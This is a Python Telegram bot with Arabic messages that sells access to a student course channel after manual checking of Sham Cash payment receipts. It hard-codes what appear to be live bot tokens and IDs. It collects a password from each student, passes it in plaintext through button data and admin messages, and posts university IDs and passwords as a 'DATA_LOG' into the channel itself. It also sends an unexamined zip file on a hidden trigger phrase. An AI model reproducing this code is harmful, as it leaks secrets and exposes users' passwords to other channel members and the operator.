import os
import telebot
from telebot import types
from flask import Flask, request

TOKEN_STUDENT = "8753263807:AAFO9rKx7yy4MeQyBbCBLnwkQvPo57v5qyw"
TOKEN_ADMIN = "8507731905:AAE-ke_vMTR2V3Yz4w3i4kTR7H-yX2JAmmE"
CHANNEL_ID = "-1002493393930"
MY_PERSONAL_ID = 2038606299

student_bot = telebot.TeleBot(TOKEN_STUDENT, threaded=False)
admin_bot = telebot.TeleBot(TOKEN_ADMIN, threaded=False)
app = Flask(__name__)

pending_receipts = set()

@app.route('/')
def home():
    try:
        with open("index.html", "r", encoding="utf-8") as f:
            return f.read()
    except:
        return "الموقع يعمل بنجاح ولكن ملف index.html غير موجود بجانب البوت!"

@app.route('/' + TOKEN_STUDENT, methods=['POST'])
def get_message_student():
    json_string = request.stream.read().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    student_bot.process_new_updates([update])
    return "!", 200

@app.route('/' + TOKEN_ADMIN, methods=['POST'])
def get_message_admin():
    json_string = request.stream.read().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    admin_bot.process_new_updates([update])
    return "!", 200
@student_bot.message_handler(commands=['start'])
def handle_start(message):
    uid = message.from_user.id
    try:
        status = student_bot.get_chat_member(CHANNEL_ID, uid).status
        if status in ['member', 'administrator', 'creator']:
            student_bot.send_message(uid, "🔓 أهلاً بك مجدداً! حسابك نشط ومفعّل في الموسوعة المعمارية.")
            return
    except:
        pass
    
    msg = student_bot.send_message(uid, "📝 الموسوعة مقفلة؛ الرجاء إدخال رقمك الجامعي لبدء التحقق والمطابقة:")
    student_bot.register_next_step_handler(msg, save_uni_id)

def save_uni_id(message):
    uid = message.from_user.id
    uni_id = message.text.strip()
    msg = student_bot.send_message(uid, "🔒 اختر كلمة مرور خاصة بحسابك لحماية بياناتك:")
    student_bot.register_next_step_handler(msg, save_password, uni_id)

def save_password(message, uni_id):
    uid = message.from_user.id
    password = message.text.strip()
    msg = student_bot.send_message(uid, "💰 مادة (ثقافة عربية) مقفلة.\nالرجاء إدخال رقم عملية تحويل شام كاش المرجعي لطلب التفعيل:")
    student_bot.register_next_step_handler(msg, handle_payment, uni_id, password)

def handle_payment(message, uni_id, password):
    uid = message.from_user.id
    receipt = message.text.strip()

    if receipt in pending_receipts:
        student_bot.send_message(uid, "❌ خطأ: رقم عملية شام كاش هذه تحت المراجعة حالياً! تم إلغاء الطلب تلقائياً.")
        return

    pending_receipts.add(receipt)

    markup = types.InlineKeyboardMarkup()
    btn_app = types.InlineKeyboardButton("✅ موافقة وتفعيل الحساب", callback_data=f"acc_{uid}_{uni_id}_{password}")
    btn_rej = types.InlineKeyboardButton("❌ رفض الطلب", callback_data=f"den_{uid}")
    markup.row(btn_app, btn_rej)

    text = f"🔔 طلب تفعيل ومطابقة جديد:\n\n👤 آيدي الطالب: {uid}\n🎓 الرقم الجامعي: {uni_id}\n🔑 الباسورد: {password}\n💵 رقم الحوالة: {receipt}"
    admin_bot.send_message(MY_PERSONAL_ID, text, reply_markup=markup)
    student_bot.send_message(uid, "⏳ تم إرسال بياناتك ورقم العملية بنجاح. يرجى الانتظار لحين مراجعة الحوالة يدوياً من قِبل الإدارة.")
@admin_bot.callback_query_handler(func=lambda call: True)
def handle_admin_buttons(call):
    parts = call.data.split('_')
    action = parts[0]
    target_uid = int(parts[1])

    if action == "acc":
        uni_id = parts[2]
        password = parts[3]
        
        try:
            link = student_bot.export_chat_invite_link(CHANNEL_ID)
            
            database_text = f"DATA_LOG\nID:{target_uid}\nUNI:{uni_id}\nPWD:{password}"
            student_bot.send_message(CHANNEL_ID, database_text)
            
            student_bot.send_message(target_uid, f"🎉 مبارك! تمت مطابقة حوالتك بنجاح.\nتم فتح القفل الأخضر 🔓 وتفعيل حسابك.\n\nرابط تصفح الملفات والمستندات أوفلاين بآمان داخل القناة المحمية:\n{link}")
            admin_bot.edit_message_text(f"✅ تم قبول الطالب {target_uid} بنجاح وتوثيقه في قاعدة بيانات القناة السحابية.", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
            
        except Exception as e:
            admin_bot.answer_callback_query(call.id, f"❌ خطأ برمجي: {str(e)}")
            
    elif action == "den":
        try:
            student_bot.send_message(target_uid, "❌ نعتذر منك، تم رفض طلبك لأن رقم عملية شام كاش غير مطابق لكشف الحساب أو الحساب مستخدم مسبقاً.")
            admin_bot.edit_message_text(f"❌ تم رفض طلب الطالب {target_uid} وإخطاره فوراً.", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
        except:
            pass

@student_bot.message_handler(func=lambda message: message.text == "download_gpa_excel")
def send_excel(message):
    uid = message.from_user.id
    try:
        with open("calculator.zip", "rb") as file:
            student_bot.send_document(uid, file, caption="💾 تفضل، ملف حاسبة المعدل التراكمي المجهز مجاناً بصيغة ZIP.")
    except:
        student_bot.send_message(uid, "❌ عذراً، ملف الحاسبة المضغوط غير متوفر حالياً على السيرفر.")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
